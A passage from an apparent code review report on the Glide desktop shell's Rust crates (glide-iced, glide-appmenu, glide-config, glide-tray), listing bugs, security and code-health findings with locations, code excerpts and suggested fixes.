2. `glyph.rs` (285 lines): Icon and glyph rendering subsystem providing cached SVG icons (`HANDLES`) and pre-rasterized geometric control masks (`cached_mask`, `image`) for window controls (`Maximize`, `Restore`, `WindowClose`), close glyphs, search icons, and chevrons.
3. `style.rs` (264 lines): Meridian color token adaptation (`Paint`), state layer blending (`over`, `layer`, `hover`, `layered`), Iced palette configuration (`iced_theme`), and default component styles for buttons, containers, popovers, and text fields.
4. `text.rs` (222 lines): Custom `Text` widget with integrated typographic metrics, letter-spacing/tracking (`tracking_em`), dynamic line height, uppercase enforcement for `.t-micro`, multi-line alignment, and caching using cosmic-text `Buffer`.
5. `font.rs` (71 lines): Font database management (`fontdb`), system UI font selection (`use_ui_family`), font revision tracking (`REVISION`), and monospace font lookup (`installed_monospace`).

The codebase is written in 100% safe Rust with zero `unsafe` blocks. It strictly complies with `AGENTS.md` § 6 (zero comments in `.rs` files). `cargo check -p glide-iced`, `cargo clippy -p glide-iced --all-targets -- -D warnings`, and all 10 unit tests pass cleanly. Deep line-by-line inspection identified 4 Bugs, 1 AGENTS.md Trap, and 8 Code Health findings spanning animation event starvation, hit-testing desynchronization under transformation scaling, float NaN clamp bypasses, unscaled palette alpha, hardcoded rasterisation scales, and unbounded memory leaks in font interning.

#### Findings

##### Critical
None identified.

##### Bug
1. **Stationary cursor event starvation halts interactive widget animations mid-transition**
   - **Location**: `crates/glide-iced/src/widgets.rs:218-250`
   - **Description**: In `Decorated::update()`, tween animations for hover, press, and focus are retargeted:
     ```rust
     let hover = cursor.is_over(layout.bounds());
     let mut changed = state.hover.retarget(f64::from(hover), motion::t1(), motion::ease_io);
     changed |= state.focus.retarget(f64::from(focused.0), motion::t1(), motion::ease_io);
     ```
     At lines 243-249, redraws are requested via:
     ```rust
     if changed
         || state.hover.is_animating(motion::t1())
         || state.press.is_animating(motion::t1())
         || state.focus.is_animating(motion::t1())
     {
         shell.request_redraw();
     }
     ```
     In Iced's architecture, `Widget::update()` is executed strictly upon receiving an event from the windowing environment (`Event::Mouse`, `Event::Keyboard`, etc.). When a user moves the cursor over a button and then stops moving the mouse, or releases a mouse click while stationary, only a single event is processed. `update()` runs once, retargets the tween, and requests a single redraw (`shell.request_redraw()`). That single frame is rendered in `Widget::draw()` (which has no access to `Shell` and cannot request further redraws). Because the mouse remains stationary, no subsequent events are dispatched to `update()`, and `is_animating(...)` is never re-checked. Consequently, hover fades freeze at their initial fractional alpha (~5%), button releases stall at a shrunk scale, and focus halo glows freeze mid-transition until the user moves the mouse again. Sustaining custom widget animations in Iced requires an animation subscription (e.g. `iced::window::frames()` or an active timer stream) to continuously pump frames while any tween is active.
2. **Transformation scaling desynchronizes mouse hit-testing and cursor interaction for scaled widgets**
   - **Location**: `crates/glide-iced/src/widgets.rs:113-115, 194-196, 204-213, 311-318, 320-323`
   - **Description**: `widgets::scale(child, scale)` wraps a child in `Decorated` with `Decoration::Scale(scale)`. In `Decorated::draw()` (lines 311-317):
     ```rust
     let center = layout.bounds().center();
     let transform = Transformation::translate(center.x, center.y)
         * Transformation::scale(scale)
         * Transformation::translate(-center.x, -center.y);
     renderer.with_transformation(transform, |renderer| {
         self.child.as_widget().draw(&tree.children[0], renderer, theme, style, layout, cursor, viewport);
     });
     ```
     While `draw()` renders the child scaled around its center, `layout()` (lines 194-196), `size()` (lines 191-193), `update()` (lines 204-213), and `mouse_interaction()` (lines 320-323) delegate directly to `self.child` without modifying the layout bounds or transforming `cursor`. In `update()` and `mouse_interaction()`, `cursor` is passed in unscaled physical coordinates. For any `scale != 1.0`, mouse interactions (hover detection, clicks, text selection, dragging) operate on the original 1.0x layout bounds. For an enlarged widget (`scale > 1.0`), clicks in the outer expanded visual area are completely dropped; for a shrunken widget (`scale < 1.0`), clicks in the empty margin outside the visual element still trigger the child. The cursor position passed to child widgets during `update` and `mouse_interaction` must be mapped through the inverse transformation matrix `transform.inverse()`.
3. **Unchecked `f32::NAN` in `side` bypasses `clamp(1.0, 256.0)` and causes zero-pixel image allocation**
   - **Location**: `crates/glide-iced/src/glyph.rs:180-194`
   - **Description**: In `image(kind: Kind, side: f32, color: Color)`:
     ```rust
     let side = side.ceil().clamp(1.0, 256.0) as u16;
     ```
     Per Rust and IEEE-754 floating-point semantics, `f32::clamp(min, max)` returns `NaN` when `self` is `NaN`. Under Rust's saturating float-to-integer conversion (`as u16`), `NaN as u16` evaluates to `0`, bypassing the intended lower bound of `1.0`. At lines 193-194:
     ```rust
     let pixels = u32::from(side) * SCALE as u32;
     let handle = iced::widget::image::Handle::from_rgba(pixels, pixels, bytes);
     ```
     When `side == 0`, `pixels` evaluates to `0`. `iced::widget::image::Handle::from_rgba` is called with dimensions `0x0`. In WGPU rendering backends (`iced_wgpu`), attempting to create a 2D GPU texture with width `0` or height `0` violates WebGPU specification constraints requiring dimensions $\ge 1$, causing an unhandled panic or GPU device validation failure. An explicit finiteness check `if !side.is_finite() { return ...; }` or `side.max(1.0).min(256.0)` is necessary.
4. **`Paint::iced_theme()` bypasses alpha scaling on `success` color token**
   - **Location**: `crates/glide-iced/src/style.rs:142-155`
   - **Description**: In `Paint::iced_theme()`:
     ```rust
     iced::Theme::custom(
         "Meridian",
         iced::theme::Palette {
             background: self.win_bg(),
             text: self.fg_1(),
             primary: self.acc_bg(),
             success: to_iced(self.tokens.ok),
             warning: self.warn(),
             danger: self.danger(),
         },
     )
     ```
     Every palette accessor (`win_bg()`, `fg_1()`, `acc_bg()`, `warn()`, `danger()`) is generated by the `colors!` macro and scales its alpha channel by `self.alpha`:
     `to_iced(self.tokens.$name).scale_alpha(self.alpha)`
     In contrast, `success` directly invokes `to_iced(self.tokens.ok)`, omitting `scale_alpha(self.alpha)`. When `Paint::faded(alpha)` is used to fade a window, popover, or inactive view hierarchy (`self.alpha < 1.0`), the `success` token remains at full 100% opacity while all other background and foreground palette colors fade, producing visual inconsistency across theme-driven widgets. `success` should call `self.ok()` to respect `self.alpha`.

##### AGENTS.md Trap
1. **Rasterisation cache keys omit output scale and dynamic theme metrics (`AGENTS.md` § 7)**
   - **Location**: `crates/glide-iced/src/glyph.rs:45, 164-200`
   - **Description**: `AGENTS.md` § 7 explicitly warns against *"Rasterisation cache keys that omit inputs. Keys built from output_scale alone go stale on a theme or font change and thrash on mixed-DPI multi-output. Every cache key must carry theme.revision() and, if it draws text, painter_generation(). Keys should be per-scale maps, not a single slot tagged with a scale."*
     In `glyph.rs`, `const SCALE: i32 = 4;` is hardcoded. `cached_mask` keys entries strictly by `(Kind, u16)`, and `image` keys entries strictly by `(Kind, u16, [u8; 4])`. Neither cache structure incorporates the display output scale (DPI factor), `theme.revision()`, or painter metrics. Rasterizing all glyphs at a fixed 4x factor forces Iced's raster renderer (e.g. `tiny-skia` or `wgpu`) to downsample images via bilinear interpolation for 1.0x, 1.25x, or 1.5x displays, causing blurry stroke edges on 1px hairlines and subpixel interference artifacts. Furthermore, because `theme.revision()` is omitted from the cache key, any runtime adjustments to theme stroke dimensions or line weights leave stale glyph bitmaps cached in `MASKS` and `CACHE`.

##### Code Health
1. **Unbounded memory leak via `Box::leak` in `interned()`**
   - **Location**: `crates/glide-iced/src/font.rs:56-65`
   - **Description**: `installed_monospace(name)` calls `interned(name)`, which allocates and leaks strings into static memory:
     ```rust
     let leaked: &'static str = Box::leak(name.to_string().into_boxed_str());
     names.push(leaked);
     ```
     If font family names are queried dynamically from user settings, terminal configuration profiles, or IPC requests, unique string allocations accumulate in heap memory and are never freed. Additionally, `names` is a `Vec<&'static str>` protected by a `Mutex`; every monospace font query performs an $O(N)$ linear scan under the lock. Replacing this with an LRU cache or `HashSet` without leaking memory would resolve the leak.
2. **Exclusive `.write()` lock contention on global `font_system` during read-only font query**
   - **Location**: `crates/glide-iced/src/font.rs:49-53`
   - **Description**: In `installed_monospace`:
     ```rust
     let mut system =
         iced::advanced::graphics::text::font_system().write().unwrap_or_else(std::sync::PoisonError::into_inner);
     let found =
         system.raw().db().faces().any(|face| face.monospaced && face.families.iter().any(|(family, _)| family == name));
     ```
     Iterating over `system.raw().db().faces()` is a read-only query. Acquiring an exclusive `.write()` lock on the global `RwLock<FontSystem>` blocks all concurrent text shaping, layout calculation, and rendering passes across the application for the duration of the scan. `font_system().read()` should be used instead.
3. **Synthesized font faces permanently accumulate in `fontdb::Database` on repeated font switching**
   - **Location**: `crates/glide-iced/src/font.rs:23-36`
   - **Description**: In `use_ui_family`, for each required typography weight where an exact face is absent, it clones the nearest matching face and appends it via `db.push_face_info(face)`. `fontdb::Database` provides no deletion API. When a user tests or switches among multiple font families in settings, synthesized face records accumulate indefinitely in the global font database on each switch, increasing face lookup overhead across all shaping passes.
4. **`field` halo ring renders outside layout bounds without layout margin expansion**
   - **Location**: `crates/glide-iced/src/widgets.rs:194-196, 269-280`
   - **Description**: In `Decoration::Field`, `draw()` renders a focus halo ring using `bounds: bounds.expand(glide_theme::component::FIELD_HALO)` with border width `FIELD_HALO` (typically 3–4px). However, `Decorated::layout()` returns `self.child.as_widget_mut().layout(...)` directly without adding margin for the halo ring. When a field receives focus, the halo is drawn outside the widget's allocated rectangle, causing it to overlap adjacent form elements or be clipped by parent containers with strict viewport bounds.
5. **Mouse release outside button does not cancel pressed state, creating false visual affordance**
   - **Location**: `crates/glide-iced/src/widgets.rs:222-241`
   - **Description**: When a button is pressed, `state.press.jump(1.0)` is executed. If the user drags the mouse outside the button bounds while keeping the mouse button held (a standard gesture to abort an accidental click), `state.press` remains at 1.0. The button continues to render scaled down (`BUTTON_PRESSED_SCALE`) and with pressed styling even though releasing the mouse outside will not trigger the click action. `state.press` should retarget to 0.0 when cursor leaves `layout.bounds()` during a drag.
6. **Missing Touch Event handling in interactive widget decorator**
   - **Location**: `crates/glide-iced/src/widgets.rs:222-241`
   - **Description**: `Decorated::update()` only monitors `Event::Mouse(mouse::Event::ButtonPressed(mouse::Button::Left))` and `Event::Mouse(mouse::Event::ButtonReleased(mouse::Button::Left))`. Touch events (`Event::Touch(touch::Event::FingerPressed { .. })`, `FingerLifted`, `FingerLost`) are not handled. On touch-enabled Wayland seats, touching a button wrapped with `widgets::button` produces no press scale or press visual feedback.
7. **`blend()` forces transparent background allocation when both styles have `None` background**
   - **Location**: `crates/glide-iced/src/widgets.rs:137-145`
   - **Description**: In `blend()`, `background` evaluates `style.background` and defaults to `Color::TRANSPARENT`. The output style is unconditionally constructed with `background: Some(Background::Color(...))`. For ghost buttons or transparent controls where both `from` and `to` have `background == None`, `blend()` introduces an explicit `Some(Background::Color(Color::TRANSPARENT))`, causing the Iced renderer to issue an unnecessary quad draw command with a transparent brush rather than skipping background rendering.
8. **Single-line centered text offset computation introduces subpixel glyph positioning blur**
   - **Location**: `crates/glide-iced/src/text.rs:146-156`
   - **Description**: In `Text::draw()`:
     ```rust
     let offset = (bounds.width - state.measured.width).max(0.0)
         * match self.align {
             alignment::Horizontal::Left => 0.0,
             alignment::Horizontal::Center => 0.5,
             alignment::Horizontal::Right => 1.0,
         };
     ```
     When `self.align == Horizontal::Center`, `offset` frequently evaluates to a non-integer fractional value (e.g. `.5` pixel). The text buffer is positioned at `iced::Point::new(bounds.x + offset, bounds.y)`. Placing text at subpixel offsets causes `cosmic-text` and `tiny-skia` rasterization to span pixel boundaries, leading to slight glyph blurriness on 1x displays. Applying `.round()` or `.floor()` to `offset` ensures crisp pixel-aligned glyph rendering.

---

### 12. `glide-appmenu` (1,436 lines)

#### Summary
`glide-appmenu` is the D-Bus side of Glide's global menu, located at `crates/glide-appmenu`. `model.rs` turns `org.gtk.Menus` / `org.gtk.Actions` group trees and `com.canonical.dbusmenu` layouts into `MenuItem` trees (mnemonics stripped, accelerators formatted, sections flattened, check and radio toggles resolved, depth capped at 16 and items at 4096). `client.rs` runs one session connection with two threads: a `listen` thread forwards `Changed` / `LayoutUpdated` / `ItemsPropertiesUpdated` / `NameOwnerChanged` into an mpsc queue, and a single `Worker` thread coalesces it (40 ms gap, 150 ms cap) and makes every blocking call (`Start` / `End` / `DescribeAll` / `Activate`, `GetLayout` / `AboutToShow` / `Event`, 3 s method timeout), reporting `Menu` / `Gone` through a `Sink`. `registrar.rs` serves `com.canonical.AppMenu.Registrar` on the same connection and drops the windows of clients that leave the bus.

The crate has no `unsafe`. The `.rs` sources carry no comments except the `#![allow(...)]` justification in `tests/dbus.rs:1-4`, so it complies with `AGENTS.md` § 6. `cargo clippy -p glide-appmenu --all-targets -- -D warnings` is clean and all 16 tests pass (12 unit, 4 integration). The integration tests run on the developer's live session bus and pass vacuously without one. Deep review found 4 Bugs, no AGENTS.md trap violations and 4 Code Health issues.

#### Findings

##### Critical
None identified.

##### Bug
1. **A source whose first fetch failed is never fetched again, so a tray menu can stay broken for the session**
   - **Location**: `crates/glide-appmenu/src/client.rs:199-206, 214-221, 283-289`; caller `crates/glide-compositor/src/tray.rs:272-288`
   - **Description**: When `refresh` fails the worker sends `Gone` but keeps the `Watched` entry. A later `Request::Watch` for the same source returns early (`if self.watched.iter().any(|w| w.source == source) { return; }`), and `Opened` only refreshes when `AboutToShow` returns `true`, which libdbusmenu-glib and Qt's `QDBusMenuAdaptor` normally do not. Scenario: a tray app is busy for more than 3 s, or exports its menu late, when its icon is first clicked. `GetLayout` fails, the compositor drops its cache on `Gone`, and every later click (`watch` ignored, `opened` without refresh) expires `tray.pending` after `MENU_WAIT`. The menu never opens until the app happens to emit `LayoutUpdated`. The GTK path has the same shape: if round 1 of `Start` fails nothing is subscribed, no `Changed` ever arrives and the bar stays empty until focus leaves and returns. `Watch` on an existing entry whose last refresh failed should refresh it.
2. **One hung client stalls every menu, and tray clicks made meanwhile are lost**
   - **Location**: `crates/glide-appmenu/src/client.rs:73, 181-195, 292-309, 374-410`; caller `crates/glide-compositor/src/tray.rs:19, 291-296`
   - **Description**: A single worker thread makes all calls in order with a 3 s timeout each, including calls whose reply is irrelevant (`End`, `Event("clicked"/"opened")`, `Activate`). With a busy GTK app focused (GIMP filter, LibreOffice recalculation) `Watch` can block 3 s on `Start` plus 3 s per `DescribeAll`, and focusing away blocks another 3 s on `End`. Every queued request waits behind it, including another app's tray menu. The tray's `MENU_WAIT` is 2 s, shorter than one timeout, so when the late `Menu` arrives `sync_tray_menu` finds the pending open expired and the click is dropped. Send the fire-and-forget calls with no-reply-expected and stop serialising unrelated clients behind one worker (e.g. a queue per bus name).
3. **Registrar events can reach the compositor out of order and leave a registration that is never removed**
   - **Location**: `crates/glide-appmenu/src/registrar.rs:60-94, 131-153`
   - **Description**: `#[zbus::interface]` runs each method call in its own task. `register_window` inserts into `windows`, drops the lock, awaits `pid_of` (a bus round trip) and only then calls `sink(Registered)`, while `unregister_window` and the `glide-appmenu-owners` thread send `Unregistered` at once. A short-lived window (`RegisterWindow(42)` then `UnregisterWindow(42)`), or a client that registers and exits inside that round trip, makes the compositor see `Unregistered{42}` before `Registered{42}`. `AppMenus::registrations` / `by_pid` then keep an entry nothing will remove, since the registrar's own map no longer has the id; a reused X11 window id can then show the stale menu instead of its own `_GTK_MENUBAR`. Resolve the pid before inserting and send the event under the same lock, or use `spawn = false`.
4. **The compositor's menu cache grows for the whole session, because unwatched sources never report `Gone`**
   - **Location**: `crates/glide-appmenu/src/client.rs:207-212, 227-251`; caller `crates/glide-compositor/src/app_menu.rs:236-245`
   - **Description**: `AppMenus::cache` inserts on every `Menu` and removes only on `Gone`. The worker sends `Gone` only for sources it still watches (`owner_changed` scans `self.watched`), and the compositor unwatches a source as soon as focus moves (the tray when an icon goes). When that client later exits, nobody removes its entry. Every app launch has a new unique bus name, so each app or tray item ever focused leaves a full menu tree in the cache, unbounded over a long session. Report `Gone` (or a `Forget`) on `Unwatch`, or prune the cache in the compositor.

##### AGENTS.md Trap
None identified. `stale |= update.unwrap_or(false)` evaluates the call before combining (no `||` over mutating calls), there are no render caches or child processes, the handle's methods are plain mpsc sends, and `start()`'s blocking round trips run once from `init_app_menu` before the event loop starts.

##### Code Health
1. **The registrar takes the bus name by replacement, loses it silently, and acknowledges calls it ignores**
   - **Location**: `crates/glide-appmenu/src/registrar.rs:112-118, 69-71`
   - **Description**: `request_name` uses zbus's default flags (`AllowReplacement | ReplaceExisting | DoNotQueue`), so Glide steals the name from another registrar and any later process can take it back; nothing listens for `NameLost`, so Qt, Chrome and LibreOffice registrations would go elsewhere with no log line. A `RegisterWindow` for an id owned by another sender is ignored but answered with success; it should return a D-Bus error.
2. **`primed` is set before the fetch succeeds, and a failed GTK fetch leaks subscriptions**
   - **Location**: `crates/glide-appmenu/src/client.rs:270-281, 322-330`
   - **Description**: A dbusmenu source is marked `primed` before `fetch_dbusmenu` runs, so if the first fetch fails the next successful one skips `AboutToShow` and lazily filled top-level menus arrive empty. In `fetch_gtk`, a `?` after round 1 drops the groups already `Start`ed without storing them, so they are never `End`ed. `refresh` also ends and restarts every group on each `Changed`.
3. **Dropping the handle never stops the worker**
   - **Location**: `crates/glide-appmenu/src/client.rs:118-161, 181-182`
   - **Description**: The `listen` thread holds a clone of `tx`, so `rx.recv()` never fails after `AppMenuHandle` is dropped, and the worker, listener, owner watcher and connection live until the process exits. Harmless for the compositor's single handle, but every `start()` in tests leaks these threads.
4. **Integration tests use the live session bus and pass when they cannot run**
   - **Location**: `crates/glide-appmenu/tests/dbus.rs:102-120, 145, 153`
   - **Description**: Without a session bus, or if `start` fails, each test returns early and is reported green. They also add match rules on the developer's real bus. The workspace's other D-Bus contracts use a private `dbus-daemon`; these tests should too, and fail rather than skip.

---

### 13. `glide-config` (1,504 lines)

#### Summary
`glide-config` is the small shared configuration crate that every Glide process links, located at `crates/glide-config`. It covers XDG base-directory resolution, `on_path` and local time (`local_minute`, with `tzset` re-read at most once a minute) in `lib.rs`; atomic and owner-only file writes (`file.rs`); a child runner with a timeout and output-draining threads (`process.rs`); parsers for `file://` URIs (`uri.rs`), `.desktop` entries (`desktop.rs`), GNOME search-provider `.ini` files (`search_providers.rs`) and the system keyboard (`keyboard.rs`: `XKB_DEFAULT_*`, xorg.conf.d, vconsole, `/etc/default/keyboard`, else a guess from the locale); persistent stores for the Passwords preferences (`passwords.rs`), remembered program permissions (`permissions.rs`) and the notification-sender log (`senders.rs`); the terminal choice (`terminal.rs`), toolkit theming support detection (`toolkits.rs`) and the autostart applets the shell replaces (`autostart.rs`).

`unsafe` appears only in `lib.rs` (`tzset`, `localtime_r`, `assume_init`), each with a `// SAFETY:` comment. The only other comment is the `#[allow(clippy::struct_excessive_bools)]` justification in `passwords.rs:19`, so the crate complies with `AGENTS.md` § 6. `cargo clippy -p glide-config --all-targets -- -D warnings` is clean and all 38 unit tests pass. No test touches environment variables. Deep review found 6 Bugs, no AGENTS.md trap violations and 4 Code Health issues.

#### Findings

##### Critical
None identified.

##### Bug
1. **Belarusian and Kazakh locales get wrong xkb layout names**
   - **Location**: `crates/glide-config/src/keyboard.rs:84-88`
   - **Description**: The locale fallback passes the language code through as the layout name: `"ru" | "be" | "kk" | … => language`. In xkeyboard-config `be` is the **Belgian** layout (Belarusian is `by`), and `kk` does not exist (Kazakh is `kz`). With no system keyboard configured, `SystemKeyboard::detect()` (used by `glide-compositor/src/config.rs`) returns `layout = "us,be"` for `be_BY.UTF-8`, so a Belarusian user's second layout is Belgian AZERTY, and `"us,kk"` for `kk_KZ.UTF-8`, which xkb cannot compile. Both are in the "Cyrillic, add a switch key" list on line 87, so a Cyrillic layout was intended. Map `be → by` and `kk → kz` like `uk → ua`, and run the Cyrillic check on the mapped name.
2. **`Prefs::save` writes every field from a stale in-memory copy and reverts changes made elsewhere**
   - **Location**: `crates/glide-config/src/passwords.rs:84-97`; callers `crates/glide-passwords/src/app.rs:245, 535`, `crates/glide-passwords/src/settings.rs:120`, `crates/glide-settings/src/panels/passwords.rs:124-128`, `crates/glide-settings/src/panels/lock_screen.rs:175-177`
   - **Description**: `save(&self)` serialises the whole struct. Glide Passwords loads `Prefs` once at start (`app.rs:245`) and never reloads; Settings keeps its own cached copy. Sequence: Passwords is open → the user turns off "Lock with screen" in Settings › Lock Screen (load, change, save) → the user toggles sorting in Passwords (`self.prefs.save()` at `app.rs:535`) → `lock-with-screen = true` is written back, and the compositor locks the keychain on every screen lock against the user's choice. The same race exists between the Lock Screen and Passwords pages inside Settings. Saving should be a read-modify-write of the changed key (e.g. `Prefs::update(|p| …)` that reloads first, or `toml_edit` on that key).
3. **`write_atomic` replaces the inode and drops extended attributes, so a Glide Text save strips Files' tags**
   - **Location**: `crates/glide-config/src/file.rs:8-37`; caller `crates/glide-text/src/document.rs:149-159`
   - **Description**: `replace` writes a new temporary file and renames it over the target, copying only the permission bits (`mode & 0o7777`). Glide Files stores colour labels and tags in the `user.xdg.tags` xattr (`glide-files/src/fs/tags.rs`), and Glide Text saves every document through `write_atomic`. Tag `notes.txt` red in Files, edit and save it in Text: the new inode has no `user.xdg.tags` and the tag is gone. POSIX ACLs, ownership by another group and hard links are lost the same way. Copy xattrs onto the temporary file before the rename, or let document saves write in place.
4. **The temporary name exceeds `NAME_MAX` for long file names, so saving fails**
   - **Location**: `crates/glide-config/src/file.rs:39-45`; caller `crates/glide-text/src/document.rs:151-153`
   - **Description**: The temporary name is `"." + file_name + ".{pid}.{n}.glide.tmp"`, about 21 bytes longer than the target. A legal target name of ≥ 235 bytes (≈ 117 Cyrillic characters) makes the temporary name longer than 255 bytes and `create_new` fails with `ENAMETOOLONG`. Glide Text only falls back to an in-place write on `PermissionDenied` / `AlreadyExists`, so such a document cannot be saved at all. Truncate the borrowed part of the name on a UTF-8 boundary or use a fixed-length random name.
5. **Desktop ids that themselves end in `.desktop` are cut short**
   - **Location**: `crates/glide-config/src/senders.rs:25-30`, `crates/glide-config/src/search_providers.rs:26`; consumers `crates/glide-settings/src/panels/notifications.rs:105-107, 165-168`, `crates/glide-settings/src/panels/search.rs:95`
   - **Description**: Telegram's desktop id is `org.telegram.desktop` and it sends exactly that as the `desktop-entry` hint. `senders::key` strips the suffix and records the sender as `org.telegram`, while Settings matches against `mute_key(app.id)` = `org.telegram.desktop`, so Settings › Notifications shows Telegram without its icon or localised name. In `parse_ini`, `trim_end_matches(".desktop")` strips repeatedly: `DesktopId=org.telegram.desktop.desktop` becomes `org.telegram`, which then fails `same_app` against the installed id. Strip `.desktop` once and only as the file extension, and compare keys in one canonical form.
6. **A user search-provider file with `DefaultDisabled=true` does not shadow the system one**
   - **Location**: `crates/glide-config/src/search_providers.rs:21-25, 44-49`
   - **Description**: `discover()` reads `$XDG_DATA_HOME` first and de-duplicates by bus and path, but `parse_ini` returns `None` for a `DefaultDisabled=true` file before the duplicate check sees it. A user who copies `/usr/share/gnome-shell/search-providers/foo.ini` into `~/.local/share/…` with `DefaultDisabled=true` to turn it off still gets the system copy, so the provider stays active. Record the identity of every parsed file, disabled ones included, and skip later files that match it.

##### AGENTS.md Trap
None identified. `process::run` waits only on its own `Child` (no `-1` reaping), and the crate has no render caches, layout geometry or `||` over mutating calls.

##### Code Health
1. **`process::run`'s deadline does not cover the output readers, and a timeout kills only the direct child**
   - **Location**: `crates/glide-config/src/process.rs:21-42`
   - **Description**: The deadline only bounds `try_wait` on the direct child; `stdout.join()` / `stderr.join()` afterwards are unbounded. A command that leaves a background process holding the pipes (`sh -c 'helper & echo ok'`) makes `run` return only when that helper exits. On timeout `child.kill()` does not reach grandchildren. Run the child in its own process group, kill the group, and wait for the readers with the remaining deadline.
2. **`Prefs::load` parses `passwords.toml` synchronously on the compositor event loop on every use**
   - **Location**: `crates/glide-config/src/passwords.rs:62-64`; callers `glide-compositor/src/autofill.rs`, `state.rs`, `passwords_applet.rs`
   - **Description**: Every password-field focus, applet click, clipboard copy and screen lock re-reads and parses the file. On a stalled `$HOME` (NFS, a sleeping disk) the compositor stalls. Cache it and invalidate by mtime, or load it on a worker.
3. **A search provider without `Version` is treated as version 2**
   - **Location**: `crates/glide-config/src/search_providers.rs:21`
   - **Description**: `keys.get("Version").is_some_and(|v| *v != "2")` accepts a file with no `Version`, which GNOME Shell treats as version 1 with a different `ActivateResult` signature. Require `Version=2`.
4. **`uri::local_path` keeps query and fragment and rejects `file:/path`**
   - **Location**: `crates/glide-config/src/uri.rs:47-55`
   - **Description**: `file:///a/b.mp3#t=10` becomes the path `/a/b.mp3#t=10`; the RFC 8089 single-slash form `file:/home/x` and upper-case `FILE://` return `None`. The function is used for command-line arguments, MPRIS art and recently-used entries.

---

### 14. `glide-tray` (1,574 lines)

#### Summary
`glide-tray` is the shell's StatusNotifierItem stack, located at `crates/glide-tray`. `model.rs` parses registration addresses (service, `bus/path`, bare path from the sender), item properties and pixmaps (ARGB to premultiplied BGRA, box-filtered `fit_square`, `is_monochrome`) and holds the watcher `Registry`. `watcher.rs` serves `org.kde.StatusNotifierWatcher` through zbus. `service.rs` runs a `glide-tray` worker thread and a `glide-tray-signals` listener thread: the worker claims the watcher name or joins an existing watcher as a host, fetches properties with `GetAll` (per-property `Get` as a fallback), backs off on hung items, coalesces `New*` signals and forwards clicks and scrolls with `call_noreply`. Tray menus are not handled here; the compositor fetches them through `glide-appmenu`.

`src/` has no `unsafe`; the only `unsafe` is `set_var` in `tests/private_bus.rs`, with a `// SAFETY:` comment. The other comments are two `#[allow(clippy::unused_self)]` justifications, so the crate complies with `AGENTS.md` § 6. `cargo clippy -p glide-tray --all-targets -- -D warnings` is clean and all 25 tests pass (24 unit, 1 private-bus integration test that ran against a real `dbus-daemon`). Deep review found 6 Bugs, no AGENTS.md trap violations and 4 Code Health issues.

#### Findings

##### Critical
None identified.

##### Bug
1. **Registrations naming a bus with no owner stay in the watcher registry forever**
   - **Location**: `crates/glide-tray/src/watcher.rs:21-34`, `crates/glide-tray/src/model.rs:322-349`, `crates/glide-tray/src/service.rs:350-359`
   - **Description**: `register_status_notifier_item` adds the parsed address to `Registry` and broadcasts `StatusNotifierItemRegistered` without checking that the bus name has an owner (KDE's watcher checks `isServiceRegistered` first). Entries only leave through `vanish`, which needs a `NameOwnerChanged` with an empty new owner, and a name that was never owned never produces one. `RegisterStatusNotifierItem("org.example.Nothing")`, or an app that registers and disconnects before the object-server task runs `add_item`, leaves a ghost key in `RegisteredStatusNotifierItems` for the session; other hosts are told to show it and the worker keeps it in `pending`. Check `NameHasOwner` before `add_item`, and drop the entry when `fetch` fails with `ServiceUnknown` / `NameHasNoOwner`.
2. **Items whose first fetch failed, and signals skipped during a stall, are never retried**
   - **Location**: `crates/glide-tray/src/service.rs:321-331, 470-471, 484-489, 524-527`
   - **Description**: `run` blocks only on `rx.recv()` and has no timer. A failed `register` (3 s `METHOD_TIMEOUT` with a 5 s backoff, or `UnknownObject` because the app registered before exporting its object) parks the address in `pending`, which is retried only when that owner emits another SNI signal or registers again; `refresh` silently skips an item while its stall is active and the skipped signal is never replayed. An app that registers while its main loop is busy for > 3 s and then sits idle (Steam at start-up) never gets an icon; an item that timed out once and emits `NewStatus("NeedsAttention")` within the backoff keeps its old status. Use `recv_timeout` up to the earliest `stall.until` and retry pending and skipped items then.
3. **Signal senders are not verified, so any session client can remove other apps' tray items**
   - **Location**: `crates/glide-tray/src/service.rs:129-173`
   - **Description**: `listen` classifies every incoming message by interface and member only. The `sender='org.freedesktop.DBus'` match rule does not filter the `MessageIterator`, and the bus delivers unicast signals to their destination regardless of match rules. A client can send Glide's unique name `org.freedesktop.DBus.NameOwnerChanged(":1.42", ":1.42", "")`; it becomes `Request::Vanished(":1.42")`, the worker drops that app's items from the strip and, in watcher mode, from the registry and broadcasts `StatusNotifierItemUnregistered`. The real app sees no watcher change, never re-registers and stays hidden until it restarts. In host mode, `StatusNotifierItem(Un)Registered` is accepted from any sender other than Glide, not only the watcher's owner. Require `sender == "org.freedesktop.DBus"` for `NameOwnerChanged` and the tracked watcher owner for watcher signals.
4. **Pixmaps are decoded as one `zvariant::Value` per byte, with no size cap**
   - **Location**: `crates/glide-tray/src/service.rs:552-562`, `crates/glide-tray/src/model.rs:257-283`
   - **Description**: `GetAll` is deserialised into `HashMap<String, OwnedValue>`, so every `ay` of `IconPixmap` / `AttentionIconPixmap` / `ToolTip` is decoded element by element into `Value::U8` (tens of bytes per byte, plus a signature check) before `pixmaps()` copies it into a `Vec<u8>`. A 256×256 pixmap costs over 10 MiB of transient heap and is paid again on every coalesced `NewIcon` from a blinking icon. A D-Bus array may be up to 64 MiB, so a buggy or hostile item can make the compositor process allocate gigabytes; nothing bounds the size before `is_valid`. Deserialise into typed `Vec<(i32, i32, Vec<u8>)>` fields and reject pixmaps above a sane side or byte limit.
5. **`Menu = "/NO_DBUSMENU"` is treated as a real menu, so right-click does nothing**
   - **Location**: `crates/glide-tray/src/model.rs:310`; caller `crates/glide-compositor/src/tray.rs:271-288`
   - **Description**: `parse_props` only rejects `"/"`. Qt's `QStatusNotifierItemAdaptor::menu()` returns `/NO_DBUSMENU` for a `QSystemTrayIcon` without a menu, and KStatusNotifierItem uses the same sentinel. `props.menu` becomes `Some("/NO_DBUSMENU")`, `open_tray_menu` watches a dbusmenu path that does not exist, the pending menu times out after `MENU_WAIT`, and `ContextMenu` is never sent, so Qt apps that build their menu on the `Context` activation never react to a right-click. Filter `/NO_DBUSMENU` alongside `/`.
6. **Turning the tray off at runtime keeps Glide as the watcher, so apps minimise into an invisible tray**
   - **Location**: `crates/glide-tray/src/service.rs:119-127`, `crates/glide-tray/src/watcher.rs:51-55`; caller `crates/glide-compositor/src/tray.rs:144-159`
